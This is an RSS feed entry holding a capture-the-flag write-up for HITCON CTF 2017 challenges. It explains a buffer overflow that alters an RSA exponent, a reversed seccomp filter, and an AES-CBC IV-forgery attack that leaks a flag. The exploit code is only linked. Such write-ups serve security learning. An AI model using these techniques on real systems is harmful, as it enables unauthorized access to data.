@@ -1,0 +1,2767 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>VHNVN&#039;s blog</title>
+	<atom:link href="https://www.vhn.vn/blog/index.php/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.vhn.vn/blog</link>
+	<description>Smile with the life, it will smile with you!</description>
+	<lastBuildDate>Mon, 06 Nov 2017 17:11:24 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.9</generator>
+<site xmlns="com-wordpress:feed-additions:1">100285338</site>	<item>
+		<title>HITCON CTF 2017 Quals</title>
+		<link>https://www.vhn.vn/blog/index.php/2017/11/06/hitcon-ctf-2017-quals/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2017/11/06/hitcon-ctf-2017-quals/#respond</comments>
+		<pubDate>Mon, 06 Nov 2017 16:57:26 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[CTF]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=163</guid>
+		<description><![CDATA[]]></description>
+				<content:encoded><![CDATA[<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto, Pwn) Secret FS</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>Can you read the flag.txt?</p>
+<p>nc 13.112.220.64 9999</p>
+<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/11/secretfs-c0119e98a895df1f361fb369bf9c98bf.elf_.zip">secretfs-c0119e98a895df1f361fb369bf9c98bf</a></p>
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>Loading the binary with IDA provides us:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/ace3ccbbfa89fb36c44983b1b66acf39">Gist</a>.</p>
+<p>Connecting to the service:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ nc 13.112.220.64 9999
+N: 104176920808444707134363566789644103637046138703732812593856489450966164422700871083271001476798525601830292237723021138499045286505397665962198734248957208942814238767855960753797521549548788530151996440657784060736603682776712677518537991291065233449586393186516770855075158900503486179189610821817031409223
+e: 3
+File list:
+flag.txt
+key.txt
+run.sh
+secret
+secretfile.txt
+Input filename(txt) :</pre>
+<p>At first i tried to factor N which give no promising result, after that @peter noticed the way server read filename can lead to buffer overflow that we can modify 2 bytes of <code>e</code>, after that we can re-read the flag file which will be encrypt using new <code>e</code> (let&#8217;s call it <code>e'</code>), if <code>gcd(e, e')=1</code> we can recover the original message by extended gcd:</p>
+<p style="text-align: center;"><img src='https://s0.wp.com/latex.php?latex=ae%2Bbe%27%3D1+%5CRightarrow+c_e%5Ea+%5Ctimes+c_%7Be%27%7D%5Eb+%3D+m%5E%7Bae%7D+%5Ctimes+m%5E%7Bbe%27%7D+%3D+m%5E%7Bae%2Bbe%27%7D+%3D+m%5E1+%3D+m&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='ae+be&#039;=1 \Rightarrow c_e^a \times c_{e&#039;}^b = m^{ae} \times m^{be&#039;} = m^{ae+be&#039;} = m^1 = m' title='ae+be&#039;=1 \Rightarrow c_e^a \times c_{e&#039;}^b = m^{ae} \times m^{be&#039;} = m^{ae+be&#039;} = m^1 = m' class='latex' />
+<p>Final solution:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/5e5af2a75381d98bed66448cb93e1aa0">Gist</a>.</p>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto, Pwn) Seccomp</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<div id="challenge-description">
+<p>I learned how to write seccomp rules, now is your turn.</p>
+<p><a href="https://s3-ap-northeast-1.amazonaws.com/hitcon2017qual-static/seccomp-05f3ea4af3f1da9331357bc167efae60">seccomp-05f3ea4af3f1da9331357bc167efae60</a></p>
+</div>
+<p><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;"></div></div></span></p>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>@mipu94 first working on this problem, dumped the seccomp part:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0001: 0x15 0x01 0x00 0x00001337  if (A == 0x1337) goto 0003
+ 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0003: 0x20 0x00 0x00 0x00000010  A = args[0]
+ 0004: 0x07 0x00 0x00 0x00000000  X = A
+ 0005: 0x54 0x00 0x00 0x0000ffff  A &amp;= 0xffff
+ 0006: 0x02 0x00 0x00 0x00000003  mem[3] = A
+ 0007: 0x87 0x00 0x00 0x00000000  A = X
+ 0008: 0x74 0x00 0x00 0x00000010  A &gt;&gt;= 16
+ 0009: 0x02 0x00 0x00 0x00000002  mem[2] = A
+ 0010: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32
+ 0011: 0x07 0x00 0x00 0x00000000  X = A
+ 0012: 0x54 0x00 0x00 0x0000ffff  A &amp;= 0xffff
+ 0013: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0014: 0x87 0x00 0x00 0x00000000  A = X
+ 0015: 0x74 0x00 0x00 0x00000010  A &gt;&gt;= 16
+ 0016: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0017: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0018: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0020
+ 0019: 0x00 0x00 0x00 0x00010000  A = 65536
+ 0020: 0x24 0x00 0x00 0x00006761  A *= 0x6761
+ 0021: 0x07 0x00 0x00 0x00000000  X = A
+ 0022: 0x34 0x00 0x00 0x00010001  A /= 0x10001
+ 0023: 0x24 0x00 0x00 0x00010001  A *= 0x10001
+ 0024: 0x84 0x00 0x00 0x00000000  A = -A
+ 0025: 0x0c 0x00 0x00 0x0000c450  A += X
+ 0026: 0x15 0x00 0x01 0x00010000  if (A != 65536) goto 0028
+ 0027: 0x00 0x00 0x00 0x00000000  A = 0
+ 0028: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0029: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0030: 0x04 0x00 0x00 0x00006c66  A += 0x6c66
+ 0031: 0x54 0x00 0x00 0x0000ffff  A &amp;= 0xffff
+ 0032: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0033: 0x60 0x00 0x00 0x00000002  A = mem[2]
+ 0034: 0x04 0x00 0x00 0x00005f65  A += 0x5f65
+ 0035: 0x54 0x00 0x00 0x0000ffff  A &amp;= 0xffff
+ 0036: 0x02 0x00 0x00 0x00000002  mem[2] = A
+ 0037: 0x60 0x00 0x00 0x00000003  A = mem[3]
+ 0038: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0040
+ 0039: 0x00 0x00 0x00 0x00010000  A = 65536
+ 0040: 0x24 0x00 0x00 0x00006b61  A *= 0x6b61
+ 0041: 0x07 0x00 0x00 0x00000000  X = A
+ 0042: 0x34 0x00 0x00 0x00010001  A /= 0x10001
+ 0043: 0x24 0x00 0x00 0x00010001  A *= 0x10001
+ 0044: 0x84 0x00 0x00 0x00000000  A = -A
+ 0045: 0x0c 0x00 0x00 0x00001577  A += X
+ 0046: 0x15 0x00 0x01 0x00010000  if (A != 65536) goto 0048
+ 0047: 0x00 0x00 0x00 0x00000000  A = 0
+ 0048: 0x02 0x00 0x00 0x00000003  mem[3] = A
+ 0049: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0050: 0x61 0x00 0x00 0x00000002  X = mem[2]
+ 0051: 0xac 0x00 0x00 0x0000340f  A ^= X
+ 0052: 0x02 0x00 0x00 0x00000004  mem[4] = A
+ 0053: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0054: 0x61 0x00 0x00 0x00000003  X = mem[3]
+ 0055: 0xac 0x00 0x00 0x0000af9f  A ^= X
+ 0056: 0x02 0x00 0x00 0x00000005  mem[5] = A
+ 0057: 0x60 0x00 0x00 0x00000004  A = mem[4]
+ 0058: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0060
+...
+ 4037: 0x0c 0x00 0x00 0x0000fc4b  A += X
+ 4038: 0x15 0x00 0x01 0x00010000  if (A != 65536) goto 4040
+ 4039: 0x00 0x00 0x00 0x00000000  A = 0
+ 4040: 0x02 0x00 0x00 0x00000003  mem[3] = A
+ 4041: 0x01 0x00 0x00 0x00001337  X = 4919
+ 4042: 0x60 0x00 0x00 0x00000003  A = mem[3]
+ 4043: 0xac 0x00 0x00 0x00008080  A ^= X
+ 4044: 0x15 0x01 0x00 0x00005d3e  if (A == 23870) goto 4046
+ 4045: 0x06 0x00 0x00 0x00000000  return KILL
+ 4046: 0x60 0x00 0x00 0x00000002  A = mem[2]
+ 4047: 0xac 0x00 0x00 0x000031c8  A ^= X
+ 4048: 0x15 0x01 0x00 0x0000d4d8  if (A == 54488) goto 4050
+ 4049: 0x06 0x00 0x00 0x00000000  return KILL
+ 4050: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 4051: 0xac 0x00 0x00 0x00000503  A ^= X
+ 4052: 0x15 0x01 0x00 0x000066c7  if (A == 26311) goto 4054
+ 4053: 0x06 0x00 0x00 0x00000000  return KILL
+ 4054: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 4055: 0xac 0x00 0x00 0x0000302c  A ^= X
+ 4056: 0x15 0x01 0x00 0x00009cef  if (A == 40175) goto 4058
+ 4057: 0x06 0x00 0x00 0x00000000  return KILL
+</pre>
+<p>Full dumped file <a href="https://gist.github.com/vanhoavn/1d76a613a41000acb366506ab9c70e47/">here</a>.</p>
+<p>He tried to solve using z3 which seems practically impossible without optimizing.</p>
+<p>After play a bit with the patterns in the dump, i notice some common patterns:</p>
+<ul>
+<li>swap pattern:</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; SWAP($mem1, $mem2)
+A = $mem1
+X = $mem2
+$mem1 = X
+$mem2 = A
+</pre>
+<ul>
+<li>xor pattern:</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; $mem3 = $mem1 ^ $mem2
+A = $mem1
+X = $mem2
+A ^= X
+$mem3 = A</pre>
+<ul>
+<li>add pattern:</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; $mem3 = ($mem1 + $mem2) &amp; 0xFFFF
+A = $mem1
+X = $mem2
+A += X
+A &amp;= 0xffff
+$mem3 = A
+</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; $mem2 = ($mem1 + $num1) &amp; 0xFFFF
+A = $mem1
+A += $num1
+A &amp;= 0xffff
+$mem2 = A
+</pre>
+<ul>
+<li>mod 0x10001 pattern:</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; $mem2 = ((CHK0($mem1) * $num2) %0x10001) &amp; 0xFFFF
+A = $mem1
+if (A != 0) goto $line1
+A = 65536
+A *= $num2
+X = A
+A /= 0x10001
+A *= 0x10001
+A = -A
+A += X
+if (A != 65536) goto $line2
+A = 0
+$mem2 = A
+</pre>
+<ul>
+<li>check memory pattern:</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; REQUIREMEM($num4, $num3, $num2, $num1, $num0)
+X = $num0
+A = mem[3]
+A ^= X
+if (A == $num1) goto $line1
+return KILL
+A = mem[2]
+A ^= X
+if (A == $num2) goto $line2
+return KILL
+A = mem[1]
+A ^= X
+if (A == $num3) goto $line3
+return KILL
+A = mem[0]
+A ^= X
+if (A == $num4) goto $line4
+return KILL
+</pre>
+<ul>
+<li>load argument pattern:</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; LOADMEM($arg1)
+A = $arg1
+X = A
+A &amp;= 0xffff
+mem[3] = A
+A = X
+A &gt;&gt;= 16
+mem[2] = A
+A = $arg1 &gt;&gt; 32
+X = A
+A &amp;= 0xffff
+mem[1] = A
+A = X
+A &gt;&gt;= 16
+mem[0] = A
+</pre>
+<p>Using these pattern and after play some more we notice some more generic patterns:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; BLOCK($num1, $num2, $num3, $num4, $num5, $num6)
+mem[0] = ((CHK0(mem[0]) * $num1) %0x10001) &amp; 0xFFFF
+mem[1] = (mem[1] + $num2) &amp; 0xFFFF
+mem[2] = (mem[2] + $num3) &amp; 0xFFFF
+mem[3] = ((CHK0(mem[3]) * $num4) %0x10001) &amp; 0xFFFF
+mem[4] = mem[0] ^ mem[2]
+mem[5] = mem[1] ^ mem[3]
+mem[4] = ((CHK0(mem[4]) * $num5) %0x10001) &amp; 0xFFFF
+mem[5] = (mem[4] + mem[5]) &amp; 0xFFFF
+mem[5] = ((CHK0(mem[5]) * $num6) %0x10001) &amp; 0xFFFF
+mem[4] = (mem[4] + mem[5]) &amp; 0xFFFF
+mem[0] = mem[0] ^ mem[5]
+mem[1] = mem[1] ^ mem[4]
+mem[2] = mem[2] ^ mem[5]
+mem[3] = mem[3] ^ mem[4]</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">; INITIAL($num1, $num2, $num3, $num4)
+mem[0] = ((CHK0(mem[0]) * $num1) %0x10001) &amp; 0xFFFF
+mem[1] = (mem[1] + $num2) &amp; 0xFFFF
+mem[2] = (mem[2] + $num3) &amp; 0xFFFF
+mem[3] = ((CHK0(mem[3]) * $num4) %0x10001) &amp; 0xFFFF
+</pre>
+<p>Here&#8217;s the script to apply these patterns:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/728e5ec804050572a984b73afd7736e6">Gist</a>.</p>
+<p>Which provided final block code:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="c">A = sys_number
+if (A == 0x1337) goto 0003
+return ALLOW
+LOADMEM(args[0])
+BLOCK(0x6761, 0x6c66, 0x5f65, 0x6b61, 0x665f, 0x615f)
+SWAP(mem[1], mem[2])
+BLOCK(0x6d61, 0x5f49, 0xccbe, 0xcad6, 0xc2cc, 0xbec2)
+SWAP(mem[1], mem[2])
+BLOCK(0xbeda, 0xc2be, 0x92ce, 0xc2d8, 0xad85, 0x997d)
+SWAP(mem[1], mem[2])
+BLOCK(0x857d, 0xb585, 0x7d25, 0x9d85, 0xb199, 0x7d95)
+SWAP(mem[1], mem[2])
+BLOCK(0xfb0a, 0xfb6b, 0xafa, 0x4b3b, 0xb63, 0x32fb)
+SWAP(mem[1], mem[2])
+BLOCK(0x2b5b, 0xb32, 0xd615, 0xf496, 0x7616, 0xc665)
+SWAP(mem[1], mem[2])
+BLOCK(0xf656, 0xb616, 0x65f6, 0x15f6, 0x2cec, 0x2d8c)
+SWAP(mem[1], mem[2])
+BLOCK(0xcbec, 0xad6c, 0x2ccb, 0xec2b, 0xedac, 0x2be9)
+INITIAL(0x1997, 0xd95a, 0xd859, 0x97d8)
+REQUIREMEM(44702, 45409, 6003, 2695, 4919)
+LOADMEM(args[1])
+BLOCK(0x7665, 0x725f, 0x7972, 0x375f, 0x6e30, 0x5f65)
+SWAP(mem[1], mem[2])
+BLOCK(0x6d6f, 0x435f, 0xbef2, 0xe46e, 0xbedc, 0x60be)
+SWAP(mem[1], mem[2])
+BLOCK(0xcada, 0xde86, 0xbeec, 0xcae4, 0xdd7d, 0xb8c1)
+SWAP(mem[1], mem[2])
+BLOCK(0x7d95, 0xb5bd, 0xd7d, 0xd995, 0xc97d, 0xe5c8)
+SWAP(mem[1], mem[2])
+BLOCK(0x82fb, 0x2b6b, 0x7a1a, 0xfbb3, 0x2b92, 0xfbcb)
+SWAP(mem[1], mem[2])
+BLOCK(0x91ba, 0xfb71, 0xd6f4, 0x35f7, 0x6657, 0x25f7)
+SWAP(mem[1], mem[2])
+BLOCK(0x9723, 0x75f6, 0xe305, 0xf656, 0xeecc, 0xae4b)
+SWAP(mem[1], mem[2])
+BLOCK(0xef2e, 0x46eb, 0xedc6, 0xbec, 0xadad, 0xe86b)
+INITIAL(0x97de, 0x5c8d, 0xd7db, 0x8c17)
+REQUIREMEM(39867, 15917, 15970, 37882, 4919)
+LOADMEM(args[2])
+BLOCK(0x6e69, 0x6b78, 0x7866, 0x5f73, 0x6968, 0x745f)
+SWAP(mem[1], mem[2])
+BLOCK(0x6573, 0x7265, 0xf0f0, 0xccbe, 0xe6d2, 0xd0e8)
+SWAP(mem[1], mem[2])
+BLOCK(0xbeca, 0xe6e4, 0xcadc, 0xd2d6, 0x7dcd, 0xa5a1)
+SWAP(mem[1], mem[2])
+BLOCK(0xd17d, 0x95cd, 0xc995, 0xb9a5, 0xade1, 0xe199)
+SWAP(mem[1], mem[2])
+BLOCK(0x43a2, 0xfb2b, 0x9b93, 0x2b73, 0x4b5b, 0xc3c3)
+SWAP(mem[1], mem[2])
+BLOCK(0x32fb, 0x9b4b, 0x5737, 0x2656, 0xe696, 0xb787)
+SWAP(mem[1], mem[2])
+BLOCK(0x8665, 0xf736, 0x9687, 0x45f6, 0xadcd, 0x2d6f)
+SWAP(mem[1], mem[2])
+BLOCK(0xf0c, 0xcbee, 0x6d2d, 0xe8b, 0xecae, 0x6e4c)
+INITIAL(0xde1e, 0x1997, 0xdcda, 0x5a1d)
+REQUIREMEM(45968, 47503, 4914, 18106, 4919)
+LOADMEM(args[3])
+BLOCK(0x2173, 0x656c, 0x7572, 0x5f70, 0x6d6f, 0x6363)
+SWAP(mem[1], mem[2])
+BLOCK(0x6573, 0x5f67, 0xd8ea, 0xe4be, 0xe0da, 0xdec6)
+SWAP(mem[1], mem[2])
+BLOCK(0xc6ca, 0xe6be, 0xce42, 0xe6ca, 0x7dc1, 0xb5bd)
+SWAP(mem[1], mem[2])
+BLOCK(0x8d8d, 0x95cd, 0x7d9c, 0x85cd, 0x95b1, 0xd5c9)
+SWAP(mem[1], mem[2])
+BLOCK(0x7b1b, 0x1b2b, 0x9afb, 0x390b, 0x9b2b, 0x63ab)
+SWAP(mem[1], mem[2])
+BLOCK(0x92fb, 0x836b, 0x5735, 0xf672, 0x1736, 0x56c7)
+SWAP(mem[1], mem[2])
+BLOCK(0x5725, 0xf706, 0xd6f6, 0x3636, 0xe42e, 0x6cad)
+SWAP(mem[1], mem[2])
+BLOCK(0x8eae, 0x4bee, 0xdad, 0xec6c, 0x6cae, 0x6bec)
+INITIAL(0x5b1d, 0x5c97, 0xdc1b, 0x5bd8)
+REQUIREMEM(52416, 34922, 5033, 1967, 4919)
+LOADMEM(args[4])
+BLOCK(0x6761, 0x6c66, 0x5f65, 0x6b61, 0x665f, 0x615f)
+SWAP(mem[1], mem[2])
+BLOCK(0x6d61, 0x5f49, 0xccbe, 0xcad6, 0xc2cc, 0xbec2)
+SWAP(mem[1], mem[2])
+BLOCK(0xbeda, 0xc2be, 0x92ce, 0xc2d8, 0xad85, 0x997d)
+SWAP(mem[1], mem[2])
+BLOCK(0x857d, 0xb585, 0x7d25, 0x9d85, 0xb199, 0x7d95)
+SWAP(mem[1], mem[2])
+BLOCK(0xfb0a, 0xfb6b, 0xafa, 0x4b3b, 0xb63, 0x32fb)
+SWAP(mem[1], mem[2])
+BLOCK(0x2b5b, 0xb32, 0xd615, 0xf496, 0x7616, 0xc665)
+SWAP(mem[1], mem[2])
+BLOCK(0xf656, 0xb616, 0x65f6, 0x15f6, 0x2cec, 0x2d8c)
+SWAP(mem[1], mem[2])
+BLOCK(0xcbec, 0xad6c, 0x2ccb, 0xec2b, 0xedac, 0x2be9)
+INITIAL(0x1997, 0xd95a, 0xd859, 0x97d8)
+REQUIREMEM(40175, 26311, 54488, 23870, 4919)</pre>
+<p>Code for BLOCK operation:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/38b46d544c24db4d0e504269baa99fca">Gist</a>.</p>
+<p>The multiplication modulo operation can be reversed easily using exgcd, remain step to reverse is the xor with <code>mem4</code> and <code>mem5</code> variables, but luckily <code>mem[0]^mem[2]</code> is constant after that step, so we can reverse blocks directly:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/625d1bb49cc2b639a67c08e4a4900386">Gist</a>.</p>
+<p>After that the final reversing is very easy:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/dd44065050436ed70da9cfc731090132">Gist</a>.</p>
+<p>Output:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">args[4]: 3399988180034215742
+args[3]: 3399988403602744163
+args[2]: 7310236399631692389
+args[1]: 8391157515662226017
+args[0]: 6878457303729123447
+6878457303729123447
+8391157515662226017
+7310236399631692389
+3399988403602744163
+3399988180034215742
+</pre>
+<p>Easy life.</p>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) Secret Server</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<div id="challenge-description">
+<p>AES is unbreakable. Right?</p>
+<p>nc 52.193.157.19 9999</p>
+<p><a href="https://s3-ap-northeast-1.amazonaws.com/hitcon2017qual-static/secretserver-03f9e1472f1088fcf5571d3288e759e3.py">secretserver-03f9e1472f1088fcf5571d3288e759e3.py</a></p>
+</div>
+<p><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;"></div></div></span></p>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>Provided python script is quite short:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/002f70a8300e61d419418a1ef37f88f8">Gist</a>.</p>
+<p>Some summary:</p>
+<ul>
+<li>AES with CBC mode.</li>
+<li>Controllable <code>IV</code> on decryption.</li>
+<li>Non-randomized pad-length byte padding and un-checked un-padding.</li>
+</ul>
+<p>So they matched for a padding-oracle attack.</p>
+<p><img src="https://i0.wp.com/upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/601px-CBC_encryption.svg.png?w=1170&#038;ssl=1" data-recalc-dims="1" /></p>
+<p><img src="https://i0.wp.com/upload.wikimedia.org/wikipedia/commons/thumb/2/2a/CBC_decryption.svg/601px-CBC_decryption.svg.png?w=1170&#038;ssl=1" data-recalc-dims="1" /></p>
+<p>First, we obtain the encrypted welcome message which provides us full information of that block&#8217;s encryption:</p>
+<ul>
+<li>Message <code>welcome_txt</code>: <code>"Welcome!!" + "\x07"*7</code></li>
+<li>IV <code>welcome_iv</code>: first 16 bytes of <code>E_welcome</code></li>
+<li>Ciphertext <code>welcome_cip</code>: remain 16 bytes of <code>E_welcome</code></li>
+</ul>
+<p>With these we can fully control the decrypted text of first block:</p>
+<img src='https://s0.wp.com/latex.php?latex=P%3DE%5Coplus+IV%5CRightarrow+P%5Coplus+x%3DE%5Coplus%5Cleft%28IV%5Coplus+x%5Cright%29&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='P=E\oplus IV\Rightarrow P\oplus x=E\oplus\left(IV\oplus x\right)' title='P=E\oplus IV\Rightarrow P\oplus x=E\oplus\left(IV\oplus x\right)' class='latex' />
+<p>or <img src='https://s0.wp.com/latex.php?latex=P_%7Bcontrol%7D%3DE_%7Bknown%7D+%5Coplus+IV_%7Bcontrol%7D&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='P_{control}=E_{known} \oplus IV_{control}' title='P_{control}=E_{known} \oplus IV_{control}' class='latex' />
+<p>where <img src='https://s0.wp.com/latex.php?latex=IV_%7Bcontrol%7D+%3D+IV+%5Coplus+x+%3D+IV+%5Coplus+P+%5Coplus+P_%7Bcontrol%7D&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='IV_{control} = IV \oplus x = IV \oplus P \oplus P_{control}' title='IV_{control} = IV \oplus x = IV \oplus P \oplus P_{control}' class='latex' />
+<p>So to let the decrypt function to decrypt the first block into any plaintext just use <code>IV xor P_0 xor P_target</code> as the new IV.</p>
+<p>So we can manage to run <code>get-flag</code> by that method and obtain the encrypted flag, which turned out to have 3 blocks.</p>
+<p>The first block of flag starts with <code>hitcon{</code> from the assert part in server code, which allow us to control first 7 bytes of the decrypted, which&#8217;s enough for the <code>get-md5</code> command.</p>
+<p>So for the first block, we can find each byte from 8<sup>th</sup> character by enumerating its value. Assume we already found out a prefix <code>p</code>, we can use the known welcome encryption information to generate encrypted <code>md5</code> hash of <code>p+c</code> for any char <code>c</code>, and then find <code>c_flag</code> by looking up <code>p+c_flag</code> using that encrypted <code>md5</code> lookup table. But at first we have to find out the 16<sup>th</sup> character of the first block so we can control the padding, which&#8217;s quite easy after we have all encrypted <code>md5</code> hash of any single byte character <code>S1</code>: just enumerating the last byte <code>c</code> until we receive a hash that&#8217;s inside <code>S1</code>, at that time the decrypted block must be <code>"get-md5" + (1 char) + (7 chars) + char(8)</code>, so the last byte is <code>c xor 8</code>.</p>
+<p>For the second and third block, i used the part <code>msg = recv_msg().strip()</code> to solve each byte using md5 by controlling the padding value: if <code>hash(s)=hash(s+c)</code> then <code>c</code> must be a whitespace character.</p>
+<p>Final solution below:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/57596dc9c7bf037da0f99b274b3d6ed1">Gist</a>.</p>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) Luaky</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<div id="challenge-description">
+<div id="challenge-description">
+<p>Are you luaky enough?</p>
+<p>nc 13.113.99.240 50216</p>
+<p><a href="https://s3-ap-northeast-1.amazonaws.com/hitcon2017qual-static/luaky-b96e16b023d07964125fa8a401b62504.elf">luaky-b96e16b023d07964125fa8a401b62504.elf</a></p>
+</div>
+<p><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;"></div></div></span></p>
+</div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) Very Luaky</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<div id="challenge-description">
+<div id="challenge-description">
+<div id="challenge-description">
+<p>You need to be VERY LUAKY <img src="https://s.w.org/images/core/emoji/11/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>nc 13.113.99.240 50216</p>
+<p><a href="https://s3-ap-northeast-1.amazonaws.com/hitcon2017qual-static/luaky-b96e16b023d07964125fa8a401b62504.elf">luaky-b96e16b023d07964125fa8a401b62504.elf</a></p>
+</div>
+<p><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;"></div></div></span></p>
+</div>
+</div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>Main function&#8217;s code:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/4414349b3160b97769831ef9286a46af">Gist</a>.</p>
+<p>This&#8217;s a Rock-paper-scissors game which use 0,1,2 as the move values. It first require us to beat Slime bot and 10 Alpaca bots to obtain the first flag, and then 10 Nozomi and 100 randomly selected bots to obtain the second flag. We must send our AI as lua code once and every match will run without additional input.</p>
+<p>All bot use pseudo random number generator to generate their moves, send last move to our ai and read our next move, then compare these moves to decide who wins, we will play 100 000 matches each game and required to win 90%, which&#8217;s 90 000 matches in order to win the game.</p>
+<ol>
